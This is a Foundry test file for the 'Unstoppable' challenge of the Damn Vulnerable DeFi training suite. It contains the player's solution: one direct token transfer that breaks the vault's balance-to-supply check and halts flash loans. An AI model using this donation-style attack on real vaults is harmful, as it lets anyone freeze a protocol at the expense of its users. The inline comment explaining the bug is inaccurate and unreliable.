// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";

contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        console.log("=== SETUP START ===");

        // Deploy token and vault
        token = new DamnValuableToken();
        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});

        console.log("Deployed token at", address(token));
        console.log("Deployed vault at", address(vault));

        // Deposit tokens to vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        console.log("Approved", TOKENS_IN_VAULT / 1e18, "tokens to vault");

        vault.deposit(TOKENS_IN_VAULT, address(deployer));
        console.log("Deposited:", TOKENS_IN_VAULT / 1e18, "tokens");
        console.log("Vault totalAssets:", vault.totalAssets() / 1e18);
        console.log("Vault totalSupply:", vault.totalSupply() / 1e18);
        console.log("Vault balanceOf(deployer):", vault.balanceOf(deployer) / 1e18);

        // Fund player's account
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
        console.log("Player funded with", token.balanceOf(player) / 1e18, "tokens");

        // Deploy monitor contract
        monitorContract = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitorContract));
        console.log("Vault ownership transferred to monitor:", address(monitorContract));

        // Flash loan check
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        console.log("Running monitor.checkFlashLoan(100)");
        monitorContract.checkFlashLoan(100e18);

        vm.stopPrank();
        console.log("=== SETUP END ===");
    }

    function test_assertInitialState() public view {
        console.log("=== ASSERT INITIAL STATE ===");
        console.log("Vault token balance:", token.balanceOf(address(vault)) / 1e18);
        console.log("Vault totalAssets:", vault.totalAssets() / 1e18);
        console.log("Vault totalSupply:", vault.totalSupply() / 1e18);

        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);

        console.log("Everything consistent");
    }

    function test_unstoppable() public checkSolvedByPlayer {
        console.log("=== PLAYER ACTION START ===");
        console.log("Vault token balance (before):", token.balanceOf(address(vault)) / 1e18);
        console.log("Vault totalAssets (before):", vault.totalAssets() / 1e18);
        console.log("Vault totalSupply (before):", vault.totalSupply() / 1e18);

        // NOTE: Arbitrary transfer — doesn’t mint shares
        token.transfer(address(vault), 1e18);
        //          This is where the bug lies. It's how solidity handle 
        //          transaction which it will approve anything called by transfer

        console.log("Player transferred 1 token directly to vault");
        console.log("Vault token balance (after):", token.balanceOf(address(vault)) / 1e18);
        console.log("Vault totalAssets (after):", vault.totalAssets() / 1e18);
        console.log("Vault totalSupply (after):", vault.totalSupply() / 1e18);

        console.log("Notice: balance increased, but supply stayed same");
        console.log("=== PLAYER ACTION END ===");
    }

    function _isSolved() private {
        console.log("=== CHECK SOLVED START ===");

        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitorContract.checkFlashLoan(100e18);

        console.log("Vault paused:", vault.paused());
        console.log("Vault owner:", vault.owner());

        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");

        console.log("=== CHECK SOLVED END ===");
    }
}
